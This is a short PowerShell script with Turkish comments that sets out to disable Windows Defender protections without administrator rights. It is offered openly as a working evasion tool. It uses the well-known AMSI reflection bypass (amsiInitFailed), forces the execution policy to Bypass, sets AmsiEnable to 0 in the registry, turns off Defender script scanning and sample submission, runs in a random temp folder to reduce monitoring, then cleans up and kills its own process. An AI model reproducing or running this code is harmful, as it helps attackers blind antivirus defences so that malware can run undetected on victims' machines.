<#
.SYNOPSIS
Yönetici hakları gerektirmeden Windows Defender'ı geçici olarak bypass eder
#>

# 1. AMSI Bypass (Temel atlama yöntemi)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. PowerShell ExecutionPolicy'ı geçici olarak bypass etme
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# 3. Defender'ın geçici olarak taramalarını atlatma
$registryPath = "HKCU:\Software\Microsoft\Windows Script\Settings"
if (-not (Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force | Out-Null
}
Set-ItemProperty -Path $registryPath -Name "AmsiEnable" -Value 0 -Type DWord -Force

# 4. Bellek tabanlı korumaları zayıflatma (yönetici olmadan yapılabilenler)
try {
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
} catch {}

# 5. Geçici bir klasörde çalışarak izlenmeyi azaltma
$tempDir = "$env:TEMP\$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Set-Location -Path $tempDir

# 6. Kod çalıştıktan sonra temizlik
Start-Sleep -Seconds 5
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# 7. Kullanıcıya basit bir çıktı göster
Write-Host "İşlem başarıyla tamamlandı. Güvenlik kontrolleri geçici olarak bypass edildi." -ForegroundColor Green

# 8. Script kendini kapatıyor
Stop-Process -Id $PID -Force